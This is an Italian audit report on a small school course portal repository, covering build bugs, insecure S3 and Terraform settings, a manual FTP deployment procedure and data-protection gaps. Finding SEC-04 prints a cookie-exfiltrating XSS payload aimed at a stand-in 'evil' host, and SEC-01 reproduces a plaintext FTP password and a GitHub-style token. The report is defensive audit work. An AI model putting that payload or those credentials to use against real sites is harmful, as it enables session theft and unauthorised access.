# Perizia tecnica - Portale ITS (`as-is`)

| | |
|---|---|
| **Oggetto** | Repository `portale-its`, cartella `as-is/` - generatore statico del portale corsi, infrastruttura AWS e procedura di pubblicazione |
| **Data** | 27 luglio 2026 |
| **Revisione analizzata** | `84ecad8` ("inizio progetto"), branch `main`, working tree pulito |
| **Ambiente di verifica** | Windows Server 2025, Node.js v24.13.0 |
| **Natura dell'intervento** | Sola analisi documentale e dinamica. **Nessuna modifica applicata al codice.** |

---

## 1. Metodologia

L'analisi è stata condotta su tutti gli 8 file versionati, senza campionamento. Oltre alla lettura statica sono state eseguite verifiche dinamiche in ambiente isolato:

- esecuzione reale di `node src/build.mjs`;
- invocazione diretta delle funzioni esportate (`totaleOre`, `render`) con dati di controllo;
- ispezione della storia Git alla ricerca di segreti (`git log -S`);
- calcolo dei rapporti di contrasto WCAG sui colori dichiarati in `style.css`.

Ogni criticità che segue riporta l'**evidenza** che la sostiene. Le criticità marcate *verificata dinamicamente* sono state riprodotte, non dedotte.

### Scala di gravità

| Livello | Significato |
|---|---|
| **S1 - Bloccante** | Il sistema non funziona come chi lo usa crede. Danno già in corso. |
| **S2 - Critica** | Compromissione della sicurezza o perdita di dati plausibile a breve termine. |
| **S3 - Alta** | Rischio operativo concreto, o dato pubblicato errato. |
| **S4 - Media** | Debito tecnico che amplifica gli altri rischi. |
| **S5 - Bassa** | Difetto di qualità, non pregiudizievole. |

---

## 2. Sintesi esecutiva

Il progetto è composto da **8 file e circa 250 righe complessive**. Nonostante la dimensione minima, presenta **29 criticità**, di cui **1 bloccante** e **6 critiche**.

Il quadro d'insieme è più grave della somma delle singole voci, per tre ragioni strutturali:

1. **Il build non funziona su Windows e non lo dice.** `npm run build` termina con codice di uscita `0`, non stampa nulla e non genera alcun file. La procedura di pubblicazione (`DEPLOY.md`, punto 3) recita *"Se da errore, riprovare"*: poiché non viene emesso alcun errore, l'operatore prosegue al punto 5 e ripubblica il contenuto vecchio di `dist/` convinto di aver pubblicato quello nuovo. **Questo spiega in modo sufficiente l'incidente documentato in `DEPLOY.md`** ("una volta si è persa la pagina dei corsi per due giorni").

2. **L'infrastruttura come codice è decorativa.** Esistono due descrizioni divergenti della stessa infrastruttura (CloudFormation e Terraform), e nessuna delle due corrisponde alla produzione: il Terraform punta a `http://127.0.0.1:5000` con credenziali `test` (emulatore locale), mentre il sito reale viene caricato a mano via FTP. Non esiste alcuna fonte di verità su cosa sia effettivamente in esecuzione.

3. **I segreti sono pubblici e già nella storia Git.** Password FTP e un token in formato Personal Access Token GitHub sono presenti in chiaro in tre file distinti e risultano committati. La rimozione dai file correnti non sarebbe sufficiente.

Va inoltre rilevato che la principale misura di sicurezza viene **attivamente disattivata come procedura**: il punto 7 di `DEPLOY.md` istruisce l'operatore a "rimettere public" il bucket ogni volta che questo dà errore. L'errore è il controllo di sicurezza che funziona; la procedura scritta è l'istruzione a rimuoverlo.

**Bus factor: 1.** La documentazione afferma esplicitamente: *"Se Marco non c'è, chiedere a Marco."*

---

## 3. Inventario dei file analizzati

| File | Righe | Ruolo | Criticità rilevate |
|---|---:|---|---|
| `src/build.mjs` | 65 | Generatore statico | BLD-01, BLD-02, BLD-03, SEC-04, DAT-02 |
| `config/impostazioni.txt` | 10 | Credenziali (in chiaro) | SEC-01 |
| `infra/portale-its.yaml` | 46 | CloudFormation | SEC-01, SEC-02, IAC-01, IAC-04 |
| `infra/tf/main.tf` | 72 | Terraform | SEC-01, SEC-02, SEC-03, IAC-01, IAC-02, IAC-03, IAC-04 |
| `DEPLOY.md` | 20 | Procedura di rilascio | OPS-01 … OPS-05, SEC-06, SEC-07 |
| `data/corsi.json` | 13 | Dati dei corsi | DAT-02, DAT-03 |
| `site/style.css` | 15 | Foglio di stile | FE-01, FE-02 |
| `package.json` | 13 | Manifest | BLD-04, BLD-05, DOC-02 |
| *assenti* | - | test, CI, lockfile, `.gitignore`, LICENSE | BLD-04, BLD-05, DOC-01 |

---

## 4. Criticità

### 4.1 Build e correttezza - la catena che rompe le pubblicazioni

---

#### `BLD-01` - Il build non si esegue su Windows e termina con successo - **S1 Bloccante**

**Posizione:** [as-is/src/build.mjs:64](as-is/src/build.mjs#L64)

```js
if (import.meta.url === `file://${process.argv[1]}`) main();
```

Il confronto costruisce un URL concatenando una stringa a un percorso di filesystem. Su POSIX i due valori coincidono per caso; su Windows non possono coincidere mai, perché `import.meta.url` è un URL con separatori `/`, tripla barra e *percent-encoding*, mentre `process.argv[1]` è un percorso nativo con `\` e lettera di unità.

**Evidenza (verificata dinamicamente):**

```
import.meta.url : file:///C:/Users/.../scratchpad/g.mjs
argv[1]         : C:\Users\...\scratchpad\g.mjs
costruito       : file://C:\Users\...\scratchpad\g.mjs
guard match?    : false
```

Esecuzione reale del build nella cartella `as-is/`:

```
$ node src/build.mjs
exit=0
$ ls dist
ls: cannot access 'dist': No such file or directory
```

**Conseguenze.** `main()` non viene mai invocata. Il comando non produce output, non crea `dist/`, e **restituisce codice di uscita 0** - quindi risulta riuscito a qualunque operatore, script o futura pipeline CI. Combinato con `DEPLOY.md` punto 5 ("trascinare il contenuto di `dist/`"), l'operatore ricarica un `dist/` residuo da una build precedente, oppure - se `dist/` non esiste - carica nulla e sovrascrive il sito con una cartella vuota. Il commento in testa al file, *"Zero dipendenze: solo Node"*, è vero e allo stesso tempo l'unica parte del file che si può considerare affidabile.

**Nota peritale.** Questo difetto ha la caratteristica peggiore possibile in un sistema di pubblicazione: **fallisce silenziosamente in direzione del successo apparente.** Va corretto prima di qualunque altra cosa, perché rende non verificabile ogni altra correzione.

---

#### `BLD-02` - Il totale delle ore pubblicato è errato per difetto - **S2 Critica**

**Posizione:** [as-is/src/build.mjs:6-8](as-is/src/build.mjs#L6-L8)

```js
export function totaleOre(corsi) {
  return corsi.slice(1).reduce((acc, c) => acc + c.ore, 0);
}
```

Lo `slice(1)` scarta il primo corso dell'elenco. Non esiste commento, test o nota che giustifichi l'esclusione; il primo elemento di `corsi.json` è un corso ordinario (`SOA-FW`, Firewall, 60 ore) reso regolarmente nella tabella HTML. Si tratta di un errore, non di una regola di dominio.

**Evidenza (verificata dinamicamente)** sui dati reali di `data/corsi.json`:

```
totaleOre() ritorna: 260
somma reale        : 320
corso escluso      : SOA-FW  60
```

**Conseguenze.** Il sito pubblica **260 ore anziché 320** - un errore del 18,75% su un dato che, per un istituto di formazione, ha rilevanza informativa verso studenti e potenzialmente verso enti finanziatori. L'errore è doppiamente diffuso: compare nel piè di tabella HTML ([build.mjs:40](as-is/src/build.mjs#L40)) e nel campo `ore` di `dist/versione.json` ([build.mjs:58](as-is/src/build.mjs#L58)), che è l'unico artefatto che un controllo automatico potrebbe leggere. La riga della tabella e il totale sono in disaccordo tra loro: sommando a mano le sei righe visibili si ottiene 320, mentre il totale dichiara 260. **Il difetto è visibile sulla pagina pubblicata da chiunque sappia sommare.**

---

#### `BLD-03` - Percorsi relativi dipendenti dalla directory di lavoro - **S4 Media**

**Posizione:** [as-is/src/build.mjs:52](as-is/src/build.mjs#L52), [60](as-is/src/build.mjs#L60)

`readFileSync("data/corsi.json")`, `cpSync("site/style.css", ...)` e `mkdirSync("dist")` risolvono rispetto alla CWD del processo, non rispetto alla posizione dello script.

**Evidenza (verificata dinamicamente)** - eseguendo dalla radice del repository:

```
Da root del repo, la lettura dati fallisce: ENOENT
  C:\Users\cristian.cioban\Documents\portale-its\data\corsi.json
```

**Conseguenze.** Il build funziona solo se lanciato con CWD esattamente `as-is/`. Da qualunque altra posizione - radice del repository, runner CI, task di editor, servizio pianificato - fallisce o, peggio, scrive `dist/` nel posto sbagliato. Rende fragile qualsiasi automazione futura. Correzione: risolvere i percorsi da `import.meta.dirname`.

---

#### `BLD-04` - Build non riproducibile: nessun lockfile, dipendenza inutilizzata, nessun vincolo di runtime - **S4 Media**

**Posizione:** [as-is/package.json](as-is/package.json)

Tre difetti convergenti, verificati:

- **Nessun lockfile.** `find . -name '*lock*'` non restituisce risultati: né `package-lock.json` né equivalenti. Due installazioni a distanza di tempo possono produrre alberi di dipendenze diversi.
- **Dipendenza dichiarata e mai usata.** `left-pad: ^1.3.0` è l'unica dipendenza. `grep -rn "left-pad"` sui sorgenti non trova alcuna occorrenza: non è importata da nessuna parte, in contraddizione con il commento *"Zero dipendenze"*. Si osserva che `left-pad` è il pacchetto al centro dell'incidente npm del 2016, ed è quindi una scelta particolarmente sfortunata come unica superficie di supply chain di un progetto che non ne ha bisogno.
- **Nessun campo `engines`.** Nessun vincolo sulla versione di Node, benché il codice usi l'optional chaining su `process.env` e - nella correzione proposta - `import.meta.dirname` (Node ≥ 20.11).

Si rileva inoltre l'assenza di `node_modules/` e di un `.gitignore`: `dist/` e `node_modules/` non sono esclusi dal versionamento, e nulla impedisce che un artefatto di build o una dipendenza vengano committati per errore.

---

#### `BLD-05` - Nessun test e nessuna integrazione continua - **S4 Media**

Non esiste alcun file di test, alcuno script `test` in `package.json`, né alcuna directory `.github/` (verificato: assente sia nella radice sia in `as-is/`).

**Conseguenze.** `BLD-01` e `BLD-02` sono esattamente i due difetti che un singolo test unitario da tre righe su `totaleOre()` e una singola verifica di esistenza di `dist/index.html` avrebbero intercettato immediatamente. L'assenza di test non è qui un difetto astratto di igiene: è la causa prossima per cui due difetti gravi sono arrivati in produzione e vi sono rimasti. Le funzioni `totaleOre` e `render` sono già esportate e quindi già testabili senza alcuna rifattorizzazione - il costo di rimedio è minimo.

---

### 4.2 Sicurezza

---

#### `SEC-01` - Credenziali e token in chiaro nel repository, presenti nella storia Git - **S2 Critica**

**Posizioni:** [as-is/config/impostazioni.txt](as-is/config/impostazioni.txt), [as-is/infra/portale-its.yaml:8](as-is/infra/portale-its.yaml#L8), [as-is/infra/tf/main.tf:22](as-is/infra/tf/main.tf#L22)

Sono esposti in chiaro, in un file versionato:

| Segreto | Valore | Sedi |
|---|---|---|
| Password FTP | `Segreteria2023!` | `impostazioni.txt` |
| Utente FTP | `segreteria` | `impostazioni.txt`, `DEPLOY.md` |
| Token "gestionale" | `ghp_1a2B3c4D5e6F7g8H9i0JklMnOpQrStUvWxYz` | `impostazioni.txt`, `portale-its.yaml` (come `Default` di parametro), `main.tf` (come `default` di variabile) |

Il file è tracciato da Git (`git ls-files` lo conferma) e privo di qualsiasi protezione. Il token ha il prefisso `ghp_`, formato dei **GitHub Personal Access Token**: un segreto di quella classe concede tipicamente accesso in scrittura ai repository dell'organizzazione, e non è quindi il "token del gestionale" che il commento suggerisce - o, se lo è, è un PAT riusato impropriamente come chiave di integrazione.

**Evidenza - il segreto è già nella storia:**

```
$ git log --all -S'ghp_1a2B3c4D5e6F7g8H9i0JklMnOpQrStUvWxYz' --oneline
84ecad8 inizio progetto
```

**Conseguenze.** Cancellare i valori dai file correnti **non è una remediation**: restano recuperabili con `git show 84ecad8`. Se il repository è stato o sarà mai reso pubblico, clonato, forkato, o esposto tramite un backup, i segreti sono compromessi in modo irreversibile. **La rotazione è obbligatoria e va considerata già dovuta**, indipendentemente da qualsiasi altra correzione.

Aggravante: la password segue uno schema indovinabile (`Ruolo` + `Anno` + `!`), il che rende prevedibili anche le credenziali di altri sistemi eventualmente creati dalla stessa persona nello stesso periodo. Il file dichiara *"Ultimo aggiornamento: Marco, marzo 2024"*: la password porta l'anno 2023, quindi non risulta ruotata da almeno tre anni.

---

#### `SEC-02` - Bucket S3 scrivibile e cancellabile da utenti anonimi - **S2 Critica**

**Posizioni:** [as-is/infra/tf/main.tf:44-56](as-is/infra/tf/main.tf#L44-L56), [as-is/infra/portale-its.yaml:19-29](as-is/infra/portale-its.yaml#L19-L29)

Entrambe le definizioni applicano la medesima policy:

```hcl
Effect    = "Allow"
Principal = "*"
Action    = "s3:*"
Resource  = "${aws_s3_bucket.sito.arn}/*"
```

`Principal = "*"` significa "qualunque utente su Internet, non autenticato". `Action = "s3:*"` **non è un permesso di lettura**: include `s3:PutObject`, `s3:DeleteObject`, `s3:PutObjectAcl`. Per un sito statico servirebbe esclusivamente `s3:GetObject`.

**Conseguenze.** Chiunque conosca il nome del bucket - che è pubblico, prevedibile e hardcoded come `portale-its-sito` - può:

- **sostituire `index.html`** e defacciare il portale dell'istituto, o inserirvi un modulo di raccolta credenziali indistinguibile dall'originale;
- **cancellare l'intero contenuto** del sito; poiché il versionamento del bucket non è abilitato (cfr. `OPS-02`) e non esiste backup, la cancellazione è **definitiva**;
- **usare il bucket per ospitare contenuti illeciti o malware** a spese dell'istituto, con conseguente responsabilità dell'intestatario dell'account.

Il rischio non è teorico: i bucket S3 con nomi istituzionali prevedibili sono oggetto di scansione automatizzata continua.

---

#### `SEC-03` - Protezione dall'esposizione pubblica disattivata su tutti e quattro i controlli - **S2 Critica**

**Posizione:** [as-is/infra/tf/main.tf:36-42](as-is/infra/tf/main.tf#L36-L42)

```hcl
block_public_acls       = false
block_public_policy     = false
ignore_public_acls      = false
restrict_public_buckets = false
```

Il `depends_on` alla riga 55 rende l'intento esplicito: il *public access block* viene deliberatamente smantellato **perché** la policy di `SEC-02` non potrebbe altrimenti essere applicata. AWS abilita questi quattro controlli per impostazione predefinita proprio per impedire la configurazione descritta in `SEC-02`; qui l'ultima rete di sicurezza è stata rimossa nel codice.

**Nota su `portale-its.yaml`.** Il template CloudFormation *non* dichiara `PublicAccessBlockConfiguration`, quindi eredita i default AWS attuali (blocco attivo). Ne segue che **la `SiteBucketPolicy` fa fallire il deploy dello stack** con `AccessDenied`. Questo è coerente con il punto 7 di `DEPLOY.md` ("Se il bucket da errore, controllare i permessi - di solito basta rimettere public") e ne identifica la causa: l'errore ricorrente che l'operatore aggira manualmente ogni venerdì è AWS che rifiuta correttamente una configurazione insicura. Cfr. `OPS-05`.

---

#### `SEC-04` - Iniezione HTML nel generatore (nessun escaping) - **S3 Alta**

**Posizione:** [as-is/src/build.mjs:10-49](as-is/src/build.mjs#L10-L49)

Quattro campi provenienti da `corsi.json` sono interpolati in template literal senza alcuna codifica: `dati.istituto` (righe 26, 31), `dati.biennio` (32), `c.codice` (15), `c.titolo` (16), `c.ore` (17), oltre a `versione` (44).

**Evidenza (verificata dinamicamente)** - passando a `render()` un titolo contenente markup:

```
OUTPUT NON ESCAPED -> <td><script>fetch("//evil/"+document.cookie)</script></td>
```

Il markup è stato emesso integro nell'HTML generato, dove il browser lo eseguirà.

**Conseguenze.** Chiunque possa modificare `corsi.json` esegue codice arbitrario nel browser di ogni visitatore del portale. Il vettore va valutato insieme al processo descritto in `DEPLOY.md`: il file è modificato a mano (punto 2), potenzialmente incollando titoli di corso da e-mail o documenti esterni, e nessuna revisione è prevista. Un apostrofo tipografico o una `&` in un titolo di corso sono sufficienti a produrre HTML non valido; un `<` a rompere la pagina. La gravità è contenuta a S3 solo perché la superficie di ingresso è oggi interna - ma `SEC-02` consente a un anonimo di modificare direttamente l'HTML pubblicato, rendendo i due difetti componibili.

**Nota.** Il campo `docente` presente in `corsi.json` non è attualmente reso in output. Se venisse aggiunto alla tabella, esporrebbe un dato personale (nome del docente) attraverso lo stesso percorso non codificato.

---

#### `SEC-05` - Nessun TLS: il portale è servito in chiaro su HTTP - **S3 Alta**

**Posizioni:** [as-is/infra/tf/main.tf:29-34](as-is/infra/tf/main.tf#L29-L34), [as-is/infra/portale-its.yaml:16-17](as-is/infra/portale-its.yaml#L16-L17)

L'unico endpoint esposto è il *website endpoint* di S3 (`!GetAtt SiteBucket.WebsiteURL`), che **supporta esclusivamente HTTP**. Non è presente alcuna distribuzione CloudFront, alcun certificato ACM, alcun dominio personalizzato, alcun redirect a HTTPS, alcun header `Strict-Transport-Security`.

**Conseguenze.** Il traffico è integralmente intercettabile e **modificabile in transito**: su una rete non fidata (Wi-Fi di istituto, rete pubblica) un attaccante può alterare i contenuti mostrati agli studenti. I browser moderni marcano il sito come "Non sicuro". L'assenza di CloudFront comporta inoltre l'assenza di caching di bordo, di log di accesso e di qualsiasi protezione dalla fatturazione per traffico anomalo - quest'ultima rilevante dato che `SEC-02` consente il caricamento di file arbitrari.

---

#### `SEC-06` - Trasferimento credenziali e contenuti via FTP in chiaro - **S4 Media**

**Posizione:** [as-is/DEPLOY.md](as-is/DEPLOY.md) punti 4-5, [as-is/config/impostazioni.txt](as-is/config/impostazioni.txt)

`FTP_HOST=ftp.portale-its.example` con client FileZilla, senza indicazione di SFTP o FTPS. Il protocollo FTP trasmette **utente e password in chiaro** sulla rete.

Si segnala l'incoerenza architetturale, di per sé significativa: la procedura pubblica il sito via FTP su un host FTP, mentre l'infrastruttura descrive un bucket S3. **I due canali non possono essere entrambi la produzione.** Non è determinabile dai soli artefatti quale dei due serva effettivamente il portale - il che è, in sé, la criticità `IAC-01`.

---

#### `SEC-07` - Accesso AWS tramite account condiviso, senza identità nominali - **S4 Media**

**Posizione:** [as-is/DEPLOY.md](as-is/DEPLOY.md) punto 6

> "Aprire la console AWS con l'utente della segreteria."

Un'utenza condivisa di reparto, usata interattivamente per operazioni di produzione. Non risultano: identità IAM individuali, MFA, principio del privilegio minimo, ruoli separati per lettura e scrittura, tracciabilità delle azioni per persona. Le credenziali AWS non sono presenti nel repository, quindi non sono qui esposte, ma il modello di accesso è privo di responsabilità individuale: **in caso di incidente non è possibile stabilire chi abbia fatto cosa**, né revocare l'accesso a una singola persona senza interrompere il lavoro di tutte le altre.

---

### 4.3 Processo di rilascio

---

#### `OPS-01` - Rilascio manuale, non riproducibile, dipendente da una persona e da una macchina - **S2 Critica**

**Posizione:** [as-is/DEPLOY.md](as-is/DEPLOY.md)

La procedura, citata alla lettera:

> "Procedura scritta da Marco nel 2023. **Se Marco non c'e, chiedere a Marco.**"
> "1. Aprire il progetto sul portatile in ufficio (**quello grigio vicino alla finestra**)."

Sono qui compresenti tre punti singoli di guasto:

- **una persona** - la documentazione stessa dichiara di non essere autosufficiente;
- **una macchina fisica** identificata per colore e posizione rispetto a una finestra, presumibilmente l'unica con l'ambiente configurato e forse l'unica copia di un `dist/` funzionante (cfr. `BLD-01`);
- **nove passaggi manuali** eseguiti da un umano, di cui uno (punto 5) è "sovrascrivere tutto" per trascinamento.

**Conseguenze.** Furto, guasto o smaltimento del portatile, o indisponibilità di una persona, interrompono la capacità di pubblicare. Non esistendo automazione né ambiente riproducibile, il tempo di ripristino della *capacità di rilascio* non è stimabile - e va misurato in giorni o settimane, non in ore. Il punto 3 ("Se da errore, riprovare") non è una procedura: è la codifica dell'accettazione di un guasto non diagnosticato, ed è precisamente ciò che maschera `BLD-01`.

---

#### `OPS-02` - Nessun rollback, nessun versionamento, nessun backup - **S2 Critica**

**Posizioni:** [as-is/DEPLOY.md](as-is/DEPLOY.md) punto 9 e note, [as-is/infra/tf/main.tf:25-27](as-is/infra/tf/main.tf#L25-L27)

Dichiarazione esplicita nel documento:

> "Non esiste una copia del sito precedente. Una volta si e persa la pagina dei corsi per due giorni."

e la procedura di ripristino:

> "9. Se qualcosa e sbagliato, rifare il punto 5 con la versione vecchia (**se qualcuno ce l'ha**)."

Riscontro nel codice: nessuna risorsa `aws_s3_bucket_versioning`, nessuna `BucketVersioning` nel template, nessuna lifecycle policy, nessun backup. Il deploy è una sovrascrittura distruttiva in place (punto 5: "Sovrascrivere tutto").

**Conseguenze.** Il piano di rollback è condizionato a un'eventualità ("se qualcuno ce l'ha"). Un incidente della durata di **due giorni è già documentato come accaduto**, il che eleva questa voce da rischio a difetto con danno storico accertato. In combinazione con `SEC-02` (cancellazione anonima possibile) e l'assenza di versionamento, esiste uno scenario realistico di **perdita definitiva e non recuperabile** del sito.

---

#### `OPS-03` - Rilascio programmato nella finestra di minor presidio - **S3 Alta**

**Posizione:** [as-is/DEPLOY.md](as-is/DEPLOY.md), note

> "Il deploy si fa il venerdi pomeriggio, quando non c'e nessuno."

La motivazione ("non c'è nessuno") tratta l'assenza di testimoni come un vantaggio, mentre è il fattore che massimizza il tempo di rilevazione. Un guasto introdotto il venerdì pomeriggio in un sistema privo di monitoraggio (`OPS-04`) e privo di rollback (`OPS-02`) resta plausibilmente in produzione **per tutto il fine settimana**. La durata di due giorni dell'incidente documentato in `OPS-02` è coerente con questo meccanismo.

---

#### `OPS-04` - Verifica solo visiva, nessun monitoraggio, nessun allarme - **S3 Alta**

**Posizione:** [as-is/DEPLOY.md](as-is/DEPLOY.md) punto 8

> "8. Aprire il sito e controllare **a occhio** che si veda."

L'unico controllo di correttezza post-rilascio è l'ispezione visiva umana. Non esistono: smoke test, verifica del codice HTTP, controllo dell'artefatto `versione.json` (che esisterebbe proprio a questo scopo), monitoraggio di disponibilità, allarmi.

**Conseguenze.** Un controllo "a occhio" non rileva né `BLD-01` (la pagina *si vede* - è semplicemente quella vecchia) né `BLD-02` (il totale *si vede* - è semplicemente sbagliato di 60 ore). **I due difetti più gravi del progetto sono entrambi invisibili al solo controllo previsto dalla procedura.** Fuori dalla finestra di rilascio, nessuno viene informato se il sito diventa indisponibile: l'istituto lo apprende dagli studenti.

---

#### `OPS-05` - La procedura documentata istruisce a disattivare il controllo di sicurezza - **S3 Alta**

**Posizione:** [as-is/DEPLOY.md](as-is/DEPLOY.md) punto 7

> "7. Se il bucket da errore, controllare i permessi (**di solito basta rimettere "public"**)."

Come stabilito in `SEC-03`, l'errore ricorrente è AWS che blocca correttamente una policy pubblica insicura. La procedura scritta trasforma questo blocco in un ostacolo di routine da rimuovere, e ne trasmette la rimozione come conoscenza operativa normale ("di solito basta").

**Conseguenze.** Anche qualora `SEC-02` e `SEC-03` venissero corretti nel codice, **questa istruzione li reintrodurrebbe manualmente al rilascio successivo.** È la voce che rende non duraturi gli interventi di sicurezza, e va corretta *contestualmente* a essi: la remediation tecnica senza la riscrittura della procedura ha efficacia di una settimana. Si segnala il fenomeno per quello che è - normalizzazione della deviazione: un allarme che scatta ogni venerdì ha smesso di essere letto come allarme.

---

### 4.4 Infrastruttura come codice e governance

---

#### `IAC-01` - Due descrizioni divergenti della stessa infrastruttura, nessuna delle quali è la produzione - **S3 Alta**

**Posizioni:** [as-is/infra/portale-its.yaml](as-is/infra/portale-its.yaml), [as-is/infra/tf/main.tf](as-is/infra/tf/main.tf)

Le stesse tre risorse (bucket `portale-its-sito`, website configuration, tabella `iscrizioni`) sono definite **due volte**, con due strumenti diversi e con differenze sostanziali:

| | CloudFormation | Terraform |
|---|---|---|
| Public access block | non dichiarato (default AWS: **attivo**) | **disattivato** su 4 controlli |
| Regione | implicita (dipende dallo stack) | `eu-south-1` |
| Endpoint | AWS reale | `http://127.0.0.1:5000` |
| Token gestionale | parametro con `Default` | variabile con `default` |
| Esito atteso del deploy | **fallisce** (cfr. `SEC-03`) | applica su emulatore locale |

A questi si aggiunge un **terzo** canale di pubblicazione - FTP via FileZilla (`DEPLOY.md`) - che non compare in nessuna delle due definizioni.

**Conseguenze.** Non esiste una fonte di verità. Applicare l'uno o l'altro file produce configurazioni di sicurezza opposte sul medesimo bucket. Non è possibile, dai soli artefatti versionati, stabilire quale sia la configurazione reale della produzione: **la prima attività di qualsiasi intervento deve essere un inventario dello stato effettivo su AWS**, poiché il repository non è attendibile in materia.

---

#### `IAC-02` - Il Terraform è puntato su un emulatore locale con credenziali fittizie - **S3 Alta**

**Posizione:** [as-is/infra/tf/main.tf:4-18](as-is/infra/tf/main.tf#L4-L18)

```hcl
access_key = "test"
secret_key = "test"
skip_credentials_validation = true
skip_metadata_api_check     = true
skip_requesting_account_id  = true
s3_use_path_style           = true
endpoints {
  s3       = "http://127.0.0.1:5000"
  dynamodb = "http://127.0.0.1:5000"
}
```

Configurazione tipica di LocalStack o `moto` in ascolto su `127.0.0.1:5000`, con tutte le validazioni di credenziali disattivate.

**Conseguenze.** `terraform apply` **non tocca AWS**: crea risorse in un emulatore effimero sulla macchina di chi lo lancia, e riporta successo. L'infrastruttura come codice esiste come file ma non governa nulla - nessuno stato reale è gestito da essa. Aggravante: la configurazione è *hardcoded* nel provider anziché parametrizzata, quindi non esiste alcun modo di puntare lo stesso codice a un ambiente reale senza modificarlo. Chi ereditasse il progetto potrebbe ragionevolmente credere, leggendo il file, che l'infrastruttura sia gestita in modo dichiarativo.

---

#### `IAC-03` - Nessun backend Terraform: stato locale, non condiviso, non protetto - **S4 Media**

**Posizione:** [as-is/infra/tf/main.tf](as-is/infra/tf/main.tf) - assenza di blocco `terraform { backend ... }`

Lo stato è scritto in `terraform.tfstate` locale. Ne conseguono: nessuna condivisione tra operatori, **nessun locking** (due `apply` concorrenti corrompono lo stato), nessuna cronologia, nessuna cifratura. Poiché lo stato Terraform memorizza in chiaro i valori delle variabili, il file conterrebbe anche il token di `SEC-01`. In assenza di `.gitignore` (cfr. `BLD-04`), nulla impedisce che venga committato.

---

#### `IAC-04` - Tabella `iscrizioni`: nessun backup, nessuna retention, nessun proprietario - **S4 Media**

**Posizioni:** [as-is/infra/tf/main.tf:58-67](as-is/infra/tf/main.tf#L58-L67), [as-is/infra/portale-its.yaml:31-41](as-is/infra/portale-its.yaml#L31-L41)

La tabella DynamoDB `iscrizioni` è definita con la sola chiave `iscrizioneId`. Non sono dichiarati: `point_in_time_recovery`, `server_side_encryption` con chiave gestita, `ttl`, tag, protezione dalla cancellazione. Nessun codice nel repository legge o scrive questa tabella: **non esiste alcun consumatore versionato**.

Il documento operativo aggiunge:

> "La tabella delle iscrizioni non l'ha mai guardata nessuno, ma c'e."

**Conseguenze.** Una tabella in produzione, in modalità a pagamento per richiesta, il cui contenuto è ignoto, senza proprietario e senza recupero point-in-time. Non è possibile stabilire se contenga dati, né di che natura - ma il nome e il contesto (portale di un istituto formativo) rendono **probabile la presenza di dati personali di studenti iscritti**. Cfr. `DAT-01`.

---

#### `IAC-05` - Nessuna separazione di ambienti, nessun tagging, nomi globali hardcoded - **S4 Media**

Non esiste distinzione tra sviluppo, collaudo e produzione: una sola definizione, un solo bucket, una sola tabella. Il nome `portale-its-sito` è *hardcoded* in entrambi i file, ma i nomi dei bucket S3 sono **globalmente unici su tutto AWS**: non è quindi possibile istanziare un secondo ambiente senza modificare il codice, né è garantito che il nome sia disponibile in un altro account. Nessuna risorsa porta tag (`Environment`, `Owner`, `CostCenter`), rendendo impossibile l'attribuzione dei costi e l'identificazione del responsabile - quest'ultima particolarmente rilevante data `IAC-04`.

---

### 4.5 Dati e conformità

---

#### `DAT-01` - Probabili dati personali senza titolare, base di trattamento, retention né cifratura documentata - **S3 Alta**

Sintesi di `IAC-04` sul piano della conformità. Una tabella denominata `iscrizioni`, in un sistema di un istituto di formazione, il cui contenuto nessuno ha mai esaminato, priva di:

- **titolare/responsabile identificato** (nessun tag `Owner`, nessuna menzione in `DEPLOY.md` oltre alla constatazione della sua esistenza);
- **politica di conservazione** (nessun TTL, nessuna lifecycle rule): i dati, se presenti, sono conservati indefinitamente;
- **cifratura dichiarata** (DynamoDB applica oggi SSE di default con chiave AWS, ma la scelta non è esplicitata né verificabile dal codice);
- **backup** (nessun PITR): un incidente comporta perdita di dati potenzialmente personali;
- **registro dei trattamenti** o qualsiasi documentazione della finalità.

**Conseguenze.** Se la tabella contiene dati di studenti - ipotesi che il contesto rende probabile e che nessun artefatto smentisce - la situazione è incompatibile con gli obblighi GDPR di limitazione della conservazione, integrità/riservatezza e accountability. Non è possibile rispondere a una richiesta di accesso o cancellazione da parte di un interessato su un archivio che nessuno sa cosa contenga. **Il primo intervento richiesto è conoscitivo**: ispezionare il contenuto e classificarlo, prima di ogni decisione tecnica.

Si segnala inoltre che `data/corsi.json` contiene il campo `docente` con nomi di persone; oggi non è pubblicato, ma è versionato in chiaro (cfr. nota in `SEC-04`).

---

#### `DAT-02` - Nessuna validazione dei dati in ingresso: propagazione silenziosa di `NaN` - **S4 Media**

**Posizioni:** [as-is/src/build.mjs:6-8](as-is/src/build.mjs#L6-L8), [52](as-is/src/build.mjs#L52)

`corsi.json` è deserializzato e usato senza alcuna verifica di schema: non si controlla che `corsi` sia un array, che `ore` sia un numero, che `codice` e `titolo` esistano.

**Evidenza (verificata dinamicamente)** - un corso privo del campo `ore`:

```
totaleOre([{ore:1},{ore:2},{titolo:'senza ore'}])  ->  NaN
```

**Conseguenze.** Una singola voce mal digitata - `"ore": "60"` come stringa, un campo dimenticato, una virgola di troppo - produce un totale `NaN` pubblicato sul sito e scritto in `versione.json`, oppure `undefined h` in una cella della tabella. Il build **non fallisce**: emette la pagina difettosa con codice di uscita 0 e, dato `OPS-04`, il difetto passa il controllo "a occhio" solo se l'operatore guarda la riga giusta. Trattandosi di un file modificato a mano ad ogni rilascio (`DEPLOY.md` punto 2), questa è la superficie di errore più frequentemente sollecitata dell'intero sistema.

---

#### `DAT-03` - Anomalia nei dati: docente unico per tutti i corsi - **S5 Bassa**

**Posizione:** [as-is/data/corsi.json:5-10](as-is/data/corsi.json#L5-L10)

Tutti e sei i corsi riportano `"docente": "P. Costanzo"`, per un totale di 320 ore su due aree formative distinte (SOA e ACA). Il dato non è reso in output, quindi non produce effetti visibili, ma è verosimilmente un residuo di popolamento o un segnaposto mai completato. Va verificato con la segreteria prima di qualunque uso del campo.

---

### 4.6 Documentazione e qualità

---

#### `DOC-01` - Documentazione assente o non trasferibile - **S4 Media**

Il `README.md` di radice contiene **13 byte**: il solo titolo `# portale-its`. Non documenta scopo, prerequisiti, come eseguire il build, come pubblicare, chi è il referente.

L'unico documento sostanziale, `DEPLOY.md`, è conoscenza tribale non trasferibile: identifica una macchina per colore e posizione, rinvia a una persona per la sua stessa comprensione, e le sue istruzioni sono in parte errate (punto 3, cfr. `BLD-01`) e in parte dannose (punto 7, cfr. `OPS-05`). Datato 2023 con ultimo aggiornamento marzo 2024, descrive un canale di pubblicazione (FTP) incoerente con l'infrastruttura versionata (S3).

